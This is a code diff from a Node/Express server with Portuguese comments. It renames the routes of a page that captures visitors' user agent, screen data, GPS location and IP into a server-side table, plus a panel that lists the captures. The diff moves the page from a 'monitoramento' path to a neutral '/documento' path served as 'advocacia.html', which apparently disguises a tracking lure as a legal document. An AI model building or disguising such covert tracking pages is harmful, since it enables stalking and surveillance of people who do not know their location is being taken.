@@ -3842,23 +3842,23 @@ async function garantirTabelaCapturas() {
 }
 
 // Rota da página "medonha" — caminho neutro, fora da marca (injeta as URLs das APIs).
-app.get("/monitoramento", (req, res) => {
+app.get("/documento", (req, res) => {
   const html = fs
-    .readFileSync(path.join(__dirname, "public", "monitoramento", "index.html"), "utf8")
-    .replace("__CAPTURA_URL__", "/monitoramento/api/captura");
+    .readFileSync(path.join(__dirname, "public", "documento", "advocacia.html"), "utf8")
+    .replace("__CAPTURA_URL__", "/documento/api/captura");
   res.send(html);
 });
 // Painel com a tabela dos dados capturados.
-app.get("/monitoramento/painel", (req, res) => {
+app.get("/documento/painel", (req, res) => {
   const html = fs
-    .readFileSync(path.join(__dirname, "public", "monitoramento", "painel.html"), "utf8")
-    .replace("__CAPTURA_LISTA_URL__", "/monitoramento/api/lista")
-    .replace("__CAPTURA_LIMPAR_URL__", "/monitoramento/api/limpar");
+    .readFileSync(path.join(__dirname, "public", "documento", "painel.html"), "utf8")
+    .replace("__CAPTURA_LISTA_URL__", "/documento/api/lista")
+    .replace("__CAPTURA_LIMPAR_URL__", "/documento/api/limpar");
   res.send(html);
 });
 
 // Recebe a captura (UA, tela, GPS) — o IP é extraído no servidor.
-app.post("/monitoramento/api/captura", async (req, res) => {
+app.post("/documento/api/captura", async (req, res) => {
   try {
     await garantirTabelaCapturas();
     const body = req.body || {};
@@ -3901,7 +3901,7 @@ app.post("/monitoramento/api/captura", async (req, res) => {
 });
 
 // Lista para o painel (mais recentes primeiro).
-app.get("/monitoramento/api/lista", async (req, res) => {
+app.get("/documento/api/lista", async (req, res) => {
   try {
     await garantirTabelaCapturas();
     const [rows] = await pool.query(
@@ -3915,7 +3915,7 @@ app.get("/monitoramento/api/lista", async (req, res) => {
 });
 
 // Limpar tudo (temporário).
-app.post("/monitoramento/api/limpar", async (req, res) => {
+app.post("/documento/api/limpar", async (req, res) => {
   try {
     await pool.query("DELETE FROM capturas_localizacao");
     res.json({ ok: true });
